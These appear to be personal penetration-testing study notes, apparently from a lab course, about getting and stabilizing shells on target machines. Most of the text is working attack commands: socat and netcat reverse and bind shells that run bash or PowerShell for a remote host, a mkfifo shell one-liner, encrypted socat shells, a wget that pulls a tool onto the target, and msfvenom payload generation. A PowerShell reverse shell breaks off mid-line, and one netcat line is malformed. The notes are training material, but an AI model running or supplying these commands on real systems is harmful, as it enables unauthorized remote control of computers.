Netcat

Socat

MSF auxiliary/multi/handler

MSF venom

[Payload of all things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Pentest Monkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

/usr/share/webshells

2 types of shells
- Reverse
- Bind 





# Shell Stabilization


```
python -c 'import pty;pty.spawn("/bin/bash")'
python2 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm 

control Z then, 

stty raw -echo; fg
```





Py
    The first thing to do is use 

```python3 -c 'import pty;pty.spawn("/bin/bash")'```

, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
    Step two is: 
```export TERM=xterm``` 
-- this will give us access to term commands such as clear.
    
Finally (and most importantly) we will background the shell using 

Ctrl + Z. 

Back in our own terminal we use 

```stty raw -echo; fg```

This does two things: 

	first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). 
	It then foregrounds the shell, thus completing the process. 

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

```
stty -a 	(new terminal  // size you want)  then set:
stty rows <number>
stty cols <number>
```



# rlwrap (good for windows)

```
sudo apt install rlwrap

rlwrap nc -lvnp <port>
```
linux use Ctrl + Z then stty raw -echo; fg

stty -a 	(new terminal  // size you want)  then set:
stty rows <number>
stty cols <number>






# Socat 

serve this [file](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) on py server:

`sudo python3 -m http.server 80`




upload from host:

**linux**:

`wget 10.6.65.43/socat -O /tmp/socat`

**windows**:

`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

stty -a 	(new terminal  // size you want)  then set:
stty rows <number>
stty cols <number>










## Socat 101


Reverse Shell

**listen**:
socat TCP-L:443 -

**connect**:
windows:
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

linux:
socat TCP:10.6.65.43:443 EXEC:"bash -li"




Bind Shell

listen:
socat TCP-LISTENER:443 EXEC:"bash -li"

socat TCP-L:<PORT> EXEC:powershell.exe,pipes


We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

connect:
socat TCP:10.10.221.44:443



target linux only:

any payload:
socat TCP-L:<port> FILE:`tty`,raw,echo=0

if socat installed:
socat TCP:10.6.65.43:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane


If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command



Socat Encrypted Shells


TCP becomes OPENSSL

1- generate certificate
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
leave blank 


2- merge file

```cat shell.key shell.crt > shell.pem```


3- set up listner

```socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -```

connect:

```socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash```

bind shell:

target-
```socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes```

attacker:

```socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -```


EXAMPLE
```
socat OPENSSL-LISTEN:53,cert=encrypt.pen,verify=0 FILE:`tty`,raw,echo=0 


socat OPENSSL:10.10.10.5:53 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```









PAYLOADS


netcat -e option let you execute a process on connection.


bind shell
```nc -lvnp <PORT> -e /bin/bash```

reverse shell
```nc <LOCAL-IP> <PORT> -e /bin/bash```


linux
```mkfifo /tmp/f; nc -lvnp 10.6.65.43 1234 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f```


windows
needs to be one line:
```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length```




### msfvenom

```msfvenom -p <PAYLOAD> <OPTIONS>```


```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>```


**staged**- good for ids detection, first stage just connects, second stage downloads code


**stageless** - most common, all in one, 

meterpreter shell  -  must be used in msf, banned from certain certifications



```<OS>/<arch>/<payload>```

linux/x86/shell_reverse_tcp


camel case = **stageless**

backslash = **staged**



```msfvenom --list payloads | grep "<OS>/<arch>/<payload>"```


